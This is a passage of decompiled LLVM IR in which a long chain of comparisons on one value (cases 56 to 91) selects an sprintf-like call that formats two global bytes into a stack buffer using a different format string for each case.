  %v2_b834 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b840 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b84c = load i8, i8* @global_var_299ba.79, align 1
  %v4_b858 = sext i8 %v3_b840 to i32
  %v6_b858 = sext i8 %v3_b84c to i32
  %v8_b858 = call i32 @szprintf(i32 %v2_b834, i32 ptrtoint ([14 x i8]* @global_var_1ec58.189 to i32), i32 %v4_b858, i32 %v6_b858, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b85c

dec_label_pc_b85c:                                ; preds = %dec_label_pc_b828, %dec_label_pc_b834
  %v7_b860 = icmp eq i32 %v2_acd8, 56
  br i1 %v7_b860, label %dec_label_pc_b868, label %dec_label_pc_b890

dec_label_pc_b868:                                ; preds = %dec_label_pc_b85c
  %v2_b868 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b874 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b880 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b88c = sext i8 %v3_b874 to i32
  %v6_b88c = sext i8 %v3_b880 to i32
  %v8_b88c = call i32 @szprintf(i32 %v2_b868, i32 ptrtoint ([14 x i8]* @global_var_1ec68.191 to i32), i32 %v4_b88c, i32 %v6_b88c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b890

dec_label_pc_b890:                                ; preds = %dec_label_pc_b85c, %dec_label_pc_b868
  %v7_b894 = icmp eq i32 %v2_acd8, 57
  br i1 %v7_b894, label %dec_label_pc_b89c, label %dec_label_pc_b8c4

dec_label_pc_b89c:                                ; preds = %dec_label_pc_b890
  %v2_b89c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b8a8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b8b4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b8c0 = sext i8 %v3_b8a8 to i32
  %v6_b8c0 = sext i8 %v3_b8b4 to i32
  %v8_b8c0 = call i32 @szprintf(i32 %v2_b89c, i32 ptrtoint ([13 x i8]* @global_var_1ec78.193 to i32), i32 %v4_b8c0, i32 %v6_b8c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8c4

dec_label_pc_b8c4:                                ; preds = %dec_label_pc_b890, %dec_label_pc_b89c
  %v7_b8c8 = icmp eq i32 %v2_acd8, 58
  br i1 %v7_b8c8, label %dec_label_pc_b8d0, label %dec_label_pc_b8f8

dec_label_pc_b8d0:                                ; preds = %dec_label_pc_b8c4
  %v2_b8d0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b8dc = load i8, i8* @global_var_299b9.78, align 1
  %v3_b8e8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b8f4 = sext i8 %v3_b8dc to i32
  %v6_b8f4 = sext i8 %v3_b8e8 to i32
  %v8_b8f4 = call i32 @szprintf(i32 %v2_b8d0, i32 ptrtoint ([14 x i8]* @global_var_1ec88.195 to i32), i32 %v4_b8f4, i32 %v6_b8f4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b8f8

dec_label_pc_b8f8:                                ; preds = %dec_label_pc_b8c4, %dec_label_pc_b8d0
  %v7_b8fc = icmp eq i32 %v2_acd8, 59
  br i1 %v7_b8fc, label %dec_label_pc_b904, label %dec_label_pc_b92c

dec_label_pc_b904:                                ; preds = %dec_label_pc_b8f8
  %v2_b904 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b910 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b91c = load i8, i8* @global_var_299ba.79, align 1
  %v4_b928 = sext i8 %v3_b910 to i32
  %v6_b928 = sext i8 %v3_b91c to i32
  %v8_b928 = call i32 @szprintf(i32 %v2_b904, i32 ptrtoint ([14 x i8]* @global_var_1ec98.197 to i32), i32 %v4_b928, i32 %v6_b928, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b92c

dec_label_pc_b92c:                                ; preds = %dec_label_pc_b8f8, %dec_label_pc_b904
  %v7_b930 = icmp eq i32 %v2_acd8, 60
  br i1 %v7_b930, label %dec_label_pc_b938, label %dec_label_pc_b960

dec_label_pc_b938:                                ; preds = %dec_label_pc_b92c
  %v2_b938 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b944 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b950 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b95c = sext i8 %v3_b944 to i32
  %v6_b95c = sext i8 %v3_b950 to i32
  %v8_b95c = call i32 @szprintf(i32 %v2_b938, i32 ptrtoint ([14 x i8]* @global_var_1eca8.199 to i32), i32 %v4_b95c, i32 %v6_b95c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b960

dec_label_pc_b960:                                ; preds = %dec_label_pc_b92c, %dec_label_pc_b938
  %v7_b964 = icmp eq i32 %v2_acd8, 61
  br i1 %v7_b964, label %dec_label_pc_b96c, label %dec_label_pc_b994

dec_label_pc_b96c:                                ; preds = %dec_label_pc_b960
  %v2_b96c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b978 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b984 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b990 = sext i8 %v3_b978 to i32
  %v6_b990 = sext i8 %v3_b984 to i32
  %v8_b990 = call i32 @szprintf(i32 %v2_b96c, i32 ptrtoint ([14 x i8]* @global_var_1ecb8.201 to i32), i32 %v4_b990, i32 %v6_b990, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b994

dec_label_pc_b994:                                ; preds = %dec_label_pc_b960, %dec_label_pc_b96c
  %v7_b998 = icmp eq i32 %v2_acd8, 62
  br i1 %v7_b998, label %dec_label_pc_b9a0, label %dec_label_pc_b9c8

dec_label_pc_b9a0:                                ; preds = %dec_label_pc_b994
  %v2_b9a0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b9ac = load i8, i8* @global_var_299b9.78, align 1
  %v3_b9b8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_b9c4 = sext i8 %v3_b9ac to i32
  %v6_b9c4 = sext i8 %v3_b9b8 to i32
  %v8_b9c4 = call i32 @szprintf(i32 %v2_b9a0, i32 ptrtoint ([14 x i8]* @global_var_1ecc8.203 to i32), i32 %v4_b9c4, i32 %v6_b9c4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9c8

dec_label_pc_b9c8:                                ; preds = %dec_label_pc_b994, %dec_label_pc_b9a0
  %v7_b9cc = icmp eq i32 %v2_acd8, 63
  br i1 %v7_b9cc, label %dec_label_pc_b9d4, label %dec_label_pc_b9fc

dec_label_pc_b9d4:                                ; preds = %dec_label_pc_b9c8
  %v2_b9d4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b9e0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_b9ec = load i8, i8* @global_var_299ba.79, align 1
  %v4_b9f8 = sext i8 %v3_b9e0 to i32
  %v6_b9f8 = sext i8 %v3_b9ec to i32
  %v8_b9f8 = call i32 @szprintf(i32 %v2_b9d4, i32 ptrtoint ([14 x i8]* @global_var_1ecd8.205 to i32), i32 %v4_b9f8, i32 %v6_b9f8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9fc

dec_label_pc_b9fc:                                ; preds = %dec_label_pc_b9c8, %dec_label_pc_b9d4
  %v7_ba00 = icmp eq i32 %v2_acd8, 64
  br i1 %v7_ba00, label %dec_label_pc_ba08, label %dec_label_pc_ba30

dec_label_pc_ba08:                                ; preds = %dec_label_pc_b9fc
  %v2_ba08 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba14 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ba20 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ba2c = sext i8 %v3_ba14 to i32
  %v6_ba2c = sext i8 %v3_ba20 to i32
  %v8_ba2c = call i32 @szprintf(i32 %v2_ba08, i32 ptrtoint ([14 x i8]* @global_var_1ece8.207 to i32), i32 %v4_ba2c, i32 %v6_ba2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba30

dec_label_pc_ba30:                                ; preds = %dec_label_pc_b9fc, %dec_label_pc_ba08
  %v7_ba34 = icmp eq i32 %v2_acd8, 65
  br i1 %v7_ba34, label %dec_label_pc_ba3c, label %dec_label_pc_ba64

dec_label_pc_ba3c:                                ; preds = %dec_label_pc_ba30
  %v2_ba3c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba48 = load i8, i8* @global_var_299b9.78, align 1
  %v3_ba54 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ba60 = sext i8 %v3_ba48 to i32
  %v6_ba60 = sext i8 %v3_ba54 to i32
  %v8_ba60 = call i32 @szprintf(i32 %v2_ba3c, i32 ptrtoint ([14 x i8]* @global_var_1ecf8.209 to i32), i32 %v4_ba60, i32 %v6_ba60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba64

dec_label_pc_ba64:                                ; preds = %dec_label_pc_ba30, %dec_label_pc_ba3c
  %v7_ba68 = icmp eq i32 %v2_acd8, 66
  br i1 %v7_ba68, label %dec_label_pc_ba70, label %dec_label_pc_ba98

dec_label_pc_ba70:                                ; preds = %dec_label_pc_ba64
  %v2_ba70 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba7c = load i8, i8* @global_var_299b9.78, align 1
  %v3_ba88 = load i8, i8* @global_var_299ba.79, align 1
  %v4_ba94 = sext i8 %v3_ba7c to i32
  %v6_ba94 = sext i8 %v3_ba88 to i32
  %v8_ba94 = call i32 @szprintf(i32 %v2_ba70, i32 ptrtoint ([14 x i8]* @global_var_1ed08.211 to i32), i32 %v4_ba94, i32 %v6_ba94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba98

dec_label_pc_ba98:                                ; preds = %dec_label_pc_ba64, %dec_label_pc_ba70
  %v7_ba9c = icmp eq i32 %v2_acd8, 67
  br i1 %v7_ba9c, label %dec_label_pc_baa4, label %dec_label_pc_bacc

dec_label_pc_baa4:                                ; preds = %dec_label_pc_ba98
  %v2_baa4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bab0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_babc = load i8, i8* @global_var_299ba.79, align 1
  %v4_bac8 = sext i8 %v3_bab0 to i32
  %v6_bac8 = sext i8 %v3_babc to i32
  %v8_bac8 = call i32 @szprintf(i32 %v2_baa4, i32 ptrtoint ([14 x i8]* @global_var_1ed18.213 to i32), i32 %v4_bac8, i32 %v6_bac8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bacc

dec_label_pc_bacc:                                ; preds = %dec_label_pc_ba98, %dec_label_pc_baa4
  %v7_bad0 = icmp eq i32 %v2_acd8, 68
  br i1 %v7_bad0, label %dec_label_pc_bad8, label %dec_label_pc_bb00

dec_label_pc_bad8:                                ; preds = %dec_label_pc_bacc
  %v2_bad8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bae4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_baf0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_bafc = sext i8 %v3_bae4 to i32
  %v6_bafc = sext i8 %v3_baf0 to i32
  %v8_bafc = call i32 @szprintf(i32 %v2_bad8, i32 ptrtoint ([14 x i8]* @global_var_1ed28.215 to i32), i32 %v4_bafc, i32 %v6_bafc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb00

dec_label_pc_bb00:                                ; preds = %dec_label_pc_bacc, %dec_label_pc_bad8
  %v7_bb04 = icmp eq i32 %v2_acd8, 69
  br i1 %v7_bb04, label %dec_label_pc_bb0c, label %dec_label_pc_bd78

dec_label_pc_bb0c:                                ; preds = %dec_label_pc_bb00
  %v2_bb0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb18 = load i8, i8* @global_var_299b9.78, align 1
  %v3_bb24 = load i8, i8* @global_var_299ba.79, align 1
  %v4_bb30 = sext i8 %v3_bb18 to i32
  %v6_bb30 = sext i8 %v3_bb24 to i32
  %v8_bb30 = call i32 @szprintf(i32 %v2_bb0c, i32 ptrtoint ([14 x i8]* @global_var_1ed38.217 to i32), i32 %v4_bb30, i32 %v6_bb30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd78

dec_label_pc_bd78:                                ; preds = %dec_label_pc_bb00, %dec_label_pc_bb0c
  %v7_bd7c = icmp eq i32 %v2_acd8, 70
  br i1 %v7_bd7c, label %dec_label_pc_bd84, label %dec_label_pc_bdac

dec_label_pc_bd84:                                ; preds = %dec_label_pc_bd78
  %v2_bd84 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd90 = load i8, i8* @global_var_299b9.78, align 1
  %v3_bd9c = load i8, i8* @global_var_299ba.79, align 1
  %v4_bda8 = sext i8 %v3_bd90 to i32
  %v6_bda8 = sext i8 %v3_bd9c to i32
  %v8_bda8 = call i32 @szprintf(i32 %v2_bd84, i32 ptrtoint ([14 x i8]* @global_var_1ed48.219 to i32), i32 %v4_bda8, i32 %v6_bda8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdac

dec_label_pc_bdac:                                ; preds = %dec_label_pc_bd78, %dec_label_pc_bd84
  %v7_bdb0 = icmp eq i32 %v2_acd8, 71
  br i1 %v7_bdb0, label %dec_label_pc_bdb8, label %dec_label_pc_bde0

dec_label_pc_bdb8:                                ; preds = %dec_label_pc_bdac
  %v2_bdb8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bdc4 = load i8, i8* @global_var_299b9.78, align 1
  %v3_bdd0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_bddc = sext i8 %v3_bdc4 to i32
  %v6_bddc = sext i8 %v3_bdd0 to i32
  %v8_bddc = call i32 @szprintf(i32 %v2_bdb8, i32 ptrtoint ([14 x i8]* @global_var_1ed58.222 to i32), i32 %v4_bddc, i32 %v6_bddc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bde0

dec_label_pc_bde0:                                ; preds = %dec_label_pc_bdac, %dec_label_pc_bdb8
  %v7_bde4 = icmp eq i32 %v2_acd8, 72
  br i1 %v7_bde4, label %dec_label_pc_bdec, label %dec_label_pc_be14

dec_label_pc_bdec:                                ; preds = %dec_label_pc_bde0
  %v2_bdec = ptrtoint i32* %stack_var_-36 to i32
  %v3_bdf8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_be04 = load i8, i8* @global_var_299ba.79, align 1
  %v4_be10 = sext i8 %v3_bdf8 to i32
  %v6_be10 = sext i8 %v3_be04 to i32
  %v8_be10 = call i32 @szprintf(i32 %v2_bdec, i32 ptrtoint ([14 x i8]* @global_var_1ed68.224 to i32), i32 %v4_be10, i32 %v6_be10, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be14

dec_label_pc_be14:                                ; preds = %dec_label_pc_bde0, %dec_label_pc_bdec
  %v7_be18 = icmp eq i32 %v2_acd8, 73
  br i1 %v7_be18, label %dec_label_pc_be20, label %dec_label_pc_be48

dec_label_pc_be20:                                ; preds = %dec_label_pc_be14
  %v2_be20 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be2c = load i8, i8* @global_var_299b9.78, align 1
  %v3_be38 = load i8, i8* @global_var_299ba.79, align 1
  %v4_be44 = sext i8 %v3_be2c to i32
  %v6_be44 = sext i8 %v3_be38 to i32
  %v8_be44 = call i32 @szprintf(i32 %v2_be20, i32 ptrtoint ([14 x i8]* @global_var_1ed78.226 to i32), i32 %v4_be44, i32 %v6_be44, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be48

dec_label_pc_be48:                                ; preds = %dec_label_pc_be14, %dec_label_pc_be20
  %v7_be4c = icmp eq i32 %v2_acd8, 74
  br i1 %v7_be4c, label %dec_label_pc_be54, label %dec_label_pc_be7c

dec_label_pc_be54:                                ; preds = %dec_label_pc_be48
  %v2_be54 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be60 = load i8, i8* @global_var_299b9.78, align 1
  %v3_be6c = load i8, i8* @global_var_299ba.79, align 1
  %v4_be78 = sext i8 %v3_be60 to i32
  %v6_be78 = sext i8 %v3_be6c to i32
  %v8_be78 = call i32 @szprintf(i32 %v2_be54, i32 ptrtoint ([14 x i8]* @global_var_1ed88.228 to i32), i32 %v4_be78, i32 %v6_be78, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be7c

dec_label_pc_be7c:                                ; preds = %dec_label_pc_be48, %dec_label_pc_be54
  %v7_be80 = icmp eq i32 %v2_acd8, 75
  br i1 %v7_be80, label %dec_label_pc_be88, label %dec_label_pc_beb0

dec_label_pc_be88:                                ; preds = %dec_label_pc_be7c
  %v2_be88 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be94 = load i8, i8* @global_var_299b9.78, align 1
  %v3_bea0 = load i8, i8* @global_var_299ba.79, align 1
  %v4_beac = sext i8 %v3_be94 to i32
  %v6_beac = sext i8 %v3_bea0 to i32
  %v8_beac = call i32 @szprintf(i32 %v2_be88, i32 ptrtoint ([14 x i8]* @global_var_1ed78.226 to i32), i32 %v4_beac, i32 %v6_beac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_beb0

dec_label_pc_beb0:                                ; preds = %dec_label_pc_be7c, %dec_label_pc_be88
  %v7_beb4 = icmp eq i32 %v2_acd8, 76
  br i1 %v7_beb4, label %dec_label_pc_bebc, label %dec_label_pc_bee4

dec_label_pc_bebc:                                ; preds = %dec_label_pc_beb0
  %v2_bebc = ptrtoint i32* %stack_var_-36 to i32
  %v3_bec8 = load i8, i8* @global_var_299b9.78, align 1
  %v3_bed4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_bee0 = sext i8 %v3_bec8 to i32
  %v6_bee0 = sext i8 %v3_bed4 to i32
  %v8_bee0 = call i32 @szprintf(i32 %v2_bebc, i32 ptrtoint ([15 x i8]* @global_var_1ed98.230 to i32), i32 %v4_bee0, i32 %v6_bee0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bee4

dec_label_pc_bee4:                                ; preds = %dec_label_pc_beb0, %dec_label_pc_bebc
  %v7_bee8 = icmp eq i32 %v2_acd8, 77
  br i1 %v7_bee8, label %dec_label_pc_bef0, label %dec_label_pc_bf18

dec_label_pc_bef0:                                ; preds = %dec_label_pc_bee4
  %v2_bef0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_befc = load i8, i8* @global_var_299b9.78, align 1
  %v3_bf08 = load i8, i8* @global_var_299ba.79, align 1
  %v4_bf14 = sext i8 %v3_befc to i32
  %v6_bf14 = sext i8 %v3_bf08 to i32
  %v8_bf14 = call i32 @szprintf(i32 %v2_bef0, i32 ptrtoint ([14 x i8]* @global_var_1eda8.232 to i32), i32 %v4_bf14, i32 %v6_bf14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf18

dec_label_pc_bf18:                                ; preds = %dec_label_pc_bee4, %dec_label_pc_bef0
  %v7_bf1c = icmp eq i32 %v2_acd8, 78
  br i1 %v7_bf1c, label %dec_label_pc_bf24, label %dec_label_pc_bf4c

dec_label_pc_bf24:                                ; preds = %dec_label_pc_bf18
  %v2_bf24 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf30 = load i8, i8* @global_var_299b9.78, align 1
  %v3_bf3c = load i8, i8* @global_var_299ba.79, align 1
  %v4_bf48 = sext i8 %v3_bf30 to i32
  %v6_bf48 = sext i8 %v3_bf3c to i32
  %v8_bf48 = call i32 @szprintf(i32 %v2_bf24, i32 ptrtoint ([14 x i8]* @global_var_1edb8.234 to i32), i32 %v4_bf48, i32 %v6_bf48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf4c

dec_label_pc_bf4c:                                ; preds = %dec_label_pc_bf18, %dec_label_pc_bf24
  %v7_bf50 = icmp eq i32 %v2_acd8, 79
  br i1 %v7_bf50, label %dec_label_pc_bf58, label %dec_label_pc_bf80

dec_label_pc_bf58:                                ; preds = %dec_label_pc_bf4c
  %v2_bf58 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf64 = load i8, i8* @global_var_299b9.78, align 1
  %v3_bf70 = load i8, i8* @global_var_299ba.79, align 1
  %v4_bf7c = sext i8 %v3_bf64 to i32
  %v6_bf7c = sext i8 %v3_bf70 to i32
  %v8_bf7c = call i32 @szprintf(i32 %v2_bf58, i32 ptrtoint ([16 x i8]* @global_var_1edc8.236 to i32), i32 %v4_bf7c, i32 %v6_bf7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf80

dec_label_pc_bf80:                                ; preds = %dec_label_pc_bf4c, %dec_label_pc_bf58
  %v7_bf84 = icmp eq i32 %v2_acd8, 80
  br i1 %v7_bf84, label %dec_label_pc_bf8c, label %dec_label_pc_bfb4

dec_label_pc_bf8c:                                ; preds = %dec_label_pc_bf80
  %v2_bf8c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf98 = load i8, i8* @global_var_299b9.78, align 1
  %v3_bfa4 = load i8, i8* @global_var_299ba.79, align 1
  %v4_bfb0 = sext i8 %v3_bf98 to i32
  %v6_bfb0 = sext i8 %v3_bfa4 to i32
  %v8_bfb0 = call i32 @szprintf(i32 %v2_bf8c, i32 ptrtoint ([14 x i8]* @global_var_1edd8.238 to i32), i32 %v4_bfb0, i32 %v6_bfb0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfb4

dec_label_pc_bfb4:                                ; preds = %dec_label_pc_bf80, %dec_label_pc_bf8c
  %v7_bfb8 = icmp eq i32 %v2_acd8, 81
  br i1 %v7_bfb8, label %dec_label_pc_bfc0, label %dec_label_pc_bfe8

dec_label_pc_bfc0:                                ; preds = %dec_label_pc_bfb4
  %v2_bfc0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfcc = load i8, i8* @global_var_299b9.78, align 1
  %v3_bfd8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_bfe4 = sext i8 %v3_bfcc to i32
  %v6_bfe4 = sext i8 %v3_bfd8 to i32
  %v8_bfe4 = call i32 @szprintf(i32 %v2_bfc0, i32 ptrtoint ([14 x i8]* @global_var_1ede8.240 to i32), i32 %v4_bfe4, i32 %v6_bfe4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfe8

dec_label_pc_bfe8:                                ; preds = %dec_label_pc_bfb4, %dec_label_pc_bfc0
  %v7_bfec = icmp eq i32 %v2_acd8, 82
  br i1 %v7_bfec, label %dec_label_pc_bff4, label %dec_label_pc_c01c

dec_label_pc_bff4:                                ; preds = %dec_label_pc_bfe8
  %v2_bff4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c000 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c00c = load i8, i8* @global_var_299ba.79, align 1
  %v4_c018 = sext i8 %v3_c000 to i32
  %v6_c018 = sext i8 %v3_c00c to i32
  %v8_c018 = call i32 @szprintf(i32 %v2_bff4, i32 ptrtoint ([14 x i8]* @global_var_1edf8.242 to i32), i32 %v4_c018, i32 %v6_c018, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c01c

dec_label_pc_c01c:                                ; preds = %dec_label_pc_bfe8, %dec_label_pc_bff4
  %v7_c020 = icmp eq i32 %v2_acd8, 83
  br i1 %v7_c020, label %dec_label_pc_c028, label %dec_label_pc_c050

dec_label_pc_c028:                                ; preds = %dec_label_pc_c01c
  %v2_c028 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c034 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c040 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c04c = sext i8 %v3_c034 to i32
  %v6_c04c = sext i8 %v3_c040 to i32
  %v8_c04c = call i32 @szprintf(i32 %v2_c028, i32 ptrtoint ([15 x i8]* @global_var_1ee08.244 to i32), i32 %v4_c04c, i32 %v6_c04c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c050

dec_label_pc_c050:                                ; preds = %dec_label_pc_c01c, %dec_label_pc_c028
  %v7_c054 = icmp eq i32 %v2_acd8, 84
  br i1 %v7_c054, label %dec_label_pc_c05c, label %dec_label_pc_c084

dec_label_pc_c05c:                                ; preds = %dec_label_pc_c050
  %v2_c05c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c068 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c074 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c080 = sext i8 %v3_c068 to i32
  %v6_c080 = sext i8 %v3_c074 to i32
  %v8_c080 = call i32 @szprintf(i32 %v2_c05c, i32 ptrtoint ([14 x i8]* @global_var_1ee18.246 to i32), i32 %v4_c080, i32 %v6_c080, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c084

dec_label_pc_c084:                                ; preds = %dec_label_pc_c050, %dec_label_pc_c05c
  %v7_c088 = icmp eq i32 %v2_acd8, 85
  br i1 %v7_c088, label %dec_label_pc_c090, label %dec_label_pc_c0b8

dec_label_pc_c090:                                ; preds = %dec_label_pc_c084
  %v2_c090 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c09c = load i8, i8* @global_var_299b9.78, align 1
  %v3_c0a8 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c0b4 = sext i8 %v3_c09c to i32
  %v6_c0b4 = sext i8 %v3_c0a8 to i32
  %v8_c0b4 = call i32 @szprintf(i32 %v2_c090, i32 ptrtoint ([14 x i8]* @global_var_1ee28.248 to i32), i32 %v4_c0b4, i32 %v6_c0b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0b8

dec_label_pc_c0b8:                                ; preds = %dec_label_pc_c084, %dec_label_pc_c090
  %v7_c0bc = icmp eq i32 %v2_acd8, 86
  br i1 %v7_c0bc, label %dec_label_pc_c0c4, label %dec_label_pc_c0ec

dec_label_pc_c0c4:                                ; preds = %dec_label_pc_c0b8
  %v2_c0c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c0d0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c0dc = load i8, i8* @global_var_299ba.79, align 1
  %v4_c0e8 = sext i8 %v3_c0d0 to i32
  %v6_c0e8 = sext i8 %v3_c0dc to i32
  %v8_c0e8 = call i32 @szprintf(i32 %v2_c0c4, i32 ptrtoint ([14 x i8]* @global_var_1ee38.250 to i32), i32 %v4_c0e8, i32 %v6_c0e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0ec

dec_label_pc_c0ec:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_c0c4
  %v7_c0f0 = icmp eq i32 %v2_acd8, 87
  br i1 %v7_c0f0, label %dec_label_pc_c0f8, label %dec_label_pc_c120

dec_label_pc_c0f8:                                ; preds = %dec_label_pc_c0ec
  %v2_c0f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c104 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c110 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c11c = sext i8 %v3_c104 to i32
  %v6_c11c = sext i8 %v3_c110 to i32
  %v8_c11c = call i32 @szprintf(i32 %v2_c0f8, i32 ptrtoint ([14 x i8]* @global_var_1ee48.252 to i32), i32 %v4_c11c, i32 %v6_c11c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c120

dec_label_pc_c120:                                ; preds = %dec_label_pc_c0ec, %dec_label_pc_c0f8
  %v7_c124 = icmp eq i32 %v2_acd8, 88
  br i1 %v7_c124, label %dec_label_pc_c12c, label %dec_label_pc_c154

dec_label_pc_c12c:                                ; preds = %dec_label_pc_c120
  %v2_c12c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c138 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c144 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c150 = sext i8 %v3_c138 to i32
  %v6_c150 = sext i8 %v3_c144 to i32
  %v8_c150 = call i32 @szprintf(i32 %v2_c12c, i32 ptrtoint ([14 x i8]* @global_var_1ee58.254 to i32), i32 %v4_c150, i32 %v6_c150, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c154

dec_label_pc_c154:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c12c
  %v7_c158 = icmp eq i32 %v2_acd8, 89
  br i1 %v7_c158, label %dec_label_pc_c160, label %dec_label_pc_c188

dec_label_pc_c160:                                ; preds = %dec_label_pc_c154
  %v2_c160 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c16c = load i8, i8* @global_var_299b9.78, align 1
  %v3_c178 = load i8, i8* @global_var_299ba.79, align 1
  %v4_c184 = sext i8 %v3_c16c to i32
  %v6_c184 = sext i8 %v3_c178 to i32
  %v8_c184 = call i32 @szprintf(i32 %v2_c160, i32 ptrtoint ([14 x i8]* @global_var_1ee68.256 to i32), i32 %v4_c184, i32 %v6_c184, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c188

dec_label_pc_c188:                                ; preds = %dec_label_pc_c154, %dec_label_pc_c160
  %v7_c18c = icmp eq i32 %v2_acd8, 90
  br i1 %v7_c18c, label %dec_label_pc_c194, label %dec_label_pc_c1bc

dec_label_pc_c194:                                ; preds = %dec_label_pc_c188
  %v2_c194 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c1a0 = load i8, i8* @global_var_299b9.78, align 1
  %v3_c1ac = load i8, i8* @global_var_299ba.79, align 1
  %v4_c1b8 = sext i8 %v3_c1a0 to i32
  %v6_c1b8 = sext i8 %v3_c1ac to i32
  %v8_c1b8 = call i32 @szprintf(i32 %v2_c194, i32 ptrtoint ([13 x i8]* @global_var_1ee78.258 to i32), i32 %v4_c1b8, i32 %v6_c1b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c1bc

dec_label_pc_c1bc:                                ; preds = %dec_label_pc_c188, %dec_label_pc_c194
  %v7_c1c0 = icmp eq i32 %v2_acd8, 91
